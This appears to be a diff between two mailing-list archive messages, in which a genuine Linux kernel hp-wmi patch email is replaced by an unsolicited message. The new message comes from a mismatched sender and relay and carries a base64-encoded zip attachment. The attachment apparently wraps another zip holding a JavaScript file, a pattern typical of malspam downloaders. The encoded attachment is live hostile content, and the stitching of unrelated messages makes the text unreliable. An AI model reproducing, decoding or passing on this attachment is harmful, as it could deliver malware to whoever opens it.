@@ -1,40 +1,65 @@
-From: Paulo Alcantara <pcacjr@zytor.com>
-Subject: [PATCH] platform/x86: hp-wmi: Remove unused macro helper
-Date: Sun, 30 Jul 2017 12:40:50 -0300
-Message-ID: <20170730154050.21545-1-pcacjr@zytor.com>
+From: <susan.christian@state.sd.us>
+Subject: (unknown)
+Date: Mon, 31 Jul 2017 10:50:20 -0000
+Message-ID: <150149822076.19426.10651457998153875072@etb.net.co>
+Mime-Version: 1.0
+Content-Type: application/zip; name="EMAIL_3070873620_platform-driver-x86.zip"
+Content-Transfer-Encoding: base64
 Return-path: <platform-driver-x86-owner@vger.kernel.org>
-Received: from terminus.zytor.com ([65.50.211.136]:38209 "EHLO mail.zytor.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1753961AbdG3PlL (ORCPT
+Received: from static-186-31-91-179.static.etb.net.co ([186.31.91.179]:45240
+        "HELO etb.net.co" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1751944AbdGaKuX (ORCPT
         <rfc822;platform-driver-x86@vger.kernel.org>);
-        Sun, 30 Jul 2017 11:41:11 -0400
+        Mon, 31 Jul 2017 06:50:23 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: platform-driver-x86-owner@vger.kernel.org
 List-ID: <platform-driver-x86.vger.kernel.org>
 To: platform-driver-x86@vger.kernel.org
-Cc: Paulo Alcantara <pcacjr@zytor.com>
 
-Signed-off-by: Paulo Alcantara <pcacjr@zytor.com>
----
- drivers/platform/x86/hp-wmi.c | 7 -------
- 1 file changed, 7 deletions(-)
-
-diff --git a/drivers/platform/x86/hp-wmi.c b/drivers/platform/x86/hp-wmi.c
-index 0df4209648d1..5a88553e31e9 100644
---- a/drivers/platform/x86/hp-wmi.c
-+++ b/drivers/platform/x86/hp-wmi.c
-@@ -107,13 +107,6 @@ enum hp_wmi_hardware_mask {
- 	HPWMI_TABLET_MASK	= 0x04,
- };
- 
--#define BIOS_ARGS_INIT(write, ctype, size)				\
--	(struct bios_args)	{	.signature = 0x55434553,	\
--					.command = (write) ? 0x2 : 0x1,	\
--					.commandtype = (ctype),		\
--					.datasize = (size),		\
--					.data = 0 }
--
- struct bios_return {
- 	u32 sigpass;
- 	u32 return_code;
--- 
-2.11.0
+UEsDBAoDAAAAAI81/0r5NunPjAkAAIwJAAAJAAAAMDgwNDEuemlwUEsDBBQDAAAIAI81/0obAKy6
+8ggAAMcoAAAKAAAAWXhZMHZlby5qc+0a7W7TMPB3kfYOBgmSqiVQviQoA1HabrTQj6WjLUJI+XCa
+dGkSEiddh8bT8Bj848WwHSd20wUGSJOQ1h93ru/DZ9/57HObaCGwWtpopPXBPvDgGnRjz0CO78nS
+G3UYacvkoA7aPa07C1RXqgMpayvDAHpytQnyjskmgFhJowl43zR0EJQzTSL3yI8cMg6WuN+Uqs09
+6Vi9Owp/fIscE3oItH1Pc00wCeNVAGwNgQg6HvSAijQ9MmxogSPcYUAwCh2oxxGQW45rVgGWdbUo
+wpyxZwITY92JbBg6C9x853hOhCCe84/vIXjjeTCEQHUMTLehg+qg59se6CqgD113UwdnMdZAlQ00
+w7Z8d4FldRghZ7VCirR34z80ugks5mIQDt/E1syXuac3reG8+mWvguMidxULjFdYJoGzob6EBpKl
+V+1hu6WoKITairgPZHEk78YN9jumc9+rWgInftdxoUwGrIMHVAFneO36EZTTzhCiOPQACmPY3Dvf
+y42PQ7XtLIXR3FebjfohweZj5g2GgMyCDIBnoCWpOscCMpskoYb9vr4+mUeY4+LFoKYTMflmxkvW
+B4CpaoROgJSOYft4ryxHpsR4z7nVmU1smpbmRpCacQ5xC3y5gNOLXbdOZksYqbJzQ0OGDWQYhn6I
+B/+NyLm4SMPV5vUazuUDx/axaLouZOJxSPwq2dU75psBEmBA4TMK7wkwotCgEFLosTaX1ShMhP5Q
+4FQoXFPopP07+mNmA4c+08NHUQSqLbRfUmhRuE9hQ+A3BQuRpESB6+Aopl+lqrL0HZzxpDTi7AN7
+8ME6WBzJeJXq+XaRbQueHntJ3I3rYDXvTP2N7R0YVezGCgmrm7yPeIm7liy+IMzjIA2DL3vMIQ+o
+R6L3qDPtRZ/G7w9QSTsQ2s+E9r2StqhTE9puSTsR2s4l+EWditBel+jxSuyMhHa8M9/dti+0w5K1
+Ukpk7ZL+l0LbEtr7QrtRot8sWRMeb0LndtSln2LwPbhc9HHpC+OQfy4TlFxbGp48YTyk8Tk6DewP
+Nz+jAg4YfsbwvQLO5DSG3QJOGHaK9IKcwvC6wO8VxosYjjP7CthnOCzMQynw2YXvLxm2GN5nuFGQ
+Nwt28xhgHdz/+aKXRMHDP42CywfDn8dE+ilkrkc0Mm6v3swWSIABhc8ovCfAlFOj0BVgQqGz1c85
+FQrXAo8n6IwojNm4HPoUhoJVikC1hfZLCi0K9ylsCPymYAn3Jf16sSd/5dFHf+nRv3DtP/i46OxK
+lggeU3cfOzfd26M1KuCA4WcM3yvgTE5j2C3ghGGnSC/IKQyvC/xeYbyI4Tizr4B9hsPCPJQCn134
+/pJhi+F9hhsFebNgNw8e1nGp8CkJpMf/Gkh/H0//HlZidF3GyOJ4/OJ7yYH2KpVyIlHxp7KZ0C7v
+DgsnFmjne2mjeM2vbJUYrLvJb/+G5rq6ZpxccP2nadlfdMftcKeqxyWqGal1MN90kjrooqR7Ml52
+eliBddz6fDxFuGzz4iUu9W+lrIpPCv2csZbx1Qhbqif3NmAiuPg0cb11CxuUhacQt6nIKgyyUo3a
+m49AksuBxA0i3ztSata+NJGaaWXHxrqwOr31Tp29e/tAweBwMhkROwBbEPmSC5BXi9mUkIZiXCfu
+gwf371fF0o3MJOM6glHgexFs+eZmp94ryGw5bqfOKzD/qsjrJI7utd7Gk77sjN7rq+HB26GbVfFn
+S6+3Op6PUGeAl+qdhmwl1DzTX8lVBfm4fne8hSBGIjIdVZTE0Xn9PnNFRvP3GfJoQeKA7BHmzfDz
+7NDpJSfdix9l0oSBPaqQxxV1g81apTRWZBAdWuyRtHDr48dbeR8PAEx5fB/cxVEOauAJ3ibhWB+/
+GUyMEXnbu49JGBIark2GczceaLgfc1MZSnhKtcJEc2VpJwJLgrUp2GeNVqjVRmdd2wdYQBBXoliP
+UChzmzIbqnjcW8oygAs+p+TocLz2x1gFnXFNVFwwMV6G6tBdYNZ8gZUDiNQAGo7mdn3XhKH8AA+S
+KcX28v2ZiWOl5Zs4TQaU5XozXZnRzXwvqa1uz5WRVwfLwdmshcxW65DkyHR3ZTGDzMmitxkf18HR
+q/7UjWNTi8n5o8D+UXuoWcZbKzmF9AjKef9yK2biyms/2BAeahzylBAGrmZAWaLxLNUliQQet4cz
+cJso19Z7KZ+l/I86K1lUy5AsWCUfghxJmJxGdPbSmC+4PHtrTMd1QHcCOTDZLZPvDPaEmzFySdfv
+bcntSmY5sWL3ddc4CohIOn2+BTMF57SbwvMq24DXvzdcmdF8C344e3/UfR22InwHnBp+zzm1Xk8G
+dXCqfzjT2tGMuJbn5OVZr2dBvdc1R2QH1gAXqeFDUqQrR7EnZ1rIWXJ9X7k6o7l/jcPDs9nhpv+6
+zLu/j4Brx12d0dxxbz/P5XB8uFSXGxNV2YPvwliSW2JWhKo2VkouV7t7c/f0w7LV3S3Kx7j28xUa
+zf2cTPWRHr8ddPWTsi36mz2M3XbttysymvvNXS6CrQ1aqVS292xzj74r5RLAaSM5nnvJZ/tsVheO
+TipM77r0lYP++4JK+iGQaSVIuzB6DhoE12pVwGXm2nGsYw5BYxMT6Q/kXylRcTwTng4tWaJ5Q6qm
+I5JPNmJD/L0r1TvRPa/T2aWtbXwxBnJKxiY9oMZgfew+z6fIb48LhHrV4ntiaexT7ibRmV0P+Scd
+tlZLe3ef93T854cTIks7M1p6O6aTpUt7nemuymi+Ywbtk/XwNBiR9xMeZWCtTrVTdTBvk5PtgqJt
+67CTqvi423p05vLXx9eVGc2dmtV6AX7EJBs8dWq/Px/52J/pA6lvdpJOp8u+0/3HGMWchck8QggT
+43AHWUIUc+nxpNXftOJElVkuo+mVmrGVWtNMQLTUarRN0yJR+qJxn3wa1TR5sezFNPDM9epweop8
+ROdW8qFnQc7ItJ2nCaz4Z6mUhtHOIxQl5NN2T7zgw3AD9kvmlfJTwE+IvMv0gfhrESFnGnneZKLB
+OjwhDypba9qs5GuV0tNVyvNrJZtIln+zU4GeUfTo+wlQSwECPwMUAwAACACPNf9KGwCsuvIIAADH
+KAAACgAkAAAAAAAAACCApIEAAAAAWXhZMHZlby5qcwoAIAAAAAAAAQAYAAC79/zpCdMBALv3/OkJ
+0wEAu/f86QnTAVBLBQYAAAAAAQABAFwAAAAaCQAAAABQSwECPwMKAwAAAACPNf9K+Tbpz4wJAACM
+CQAACQAkAAAAAAAAACCApIEAAAAAMDgwNDEuemlwCgAgAAAAAAABABgAALv3/OkJ0wEAu/f86QnT
+AQC79/zpCdMBUEsFBgAAAAABAAEAWwAAALMJAAAAAA==
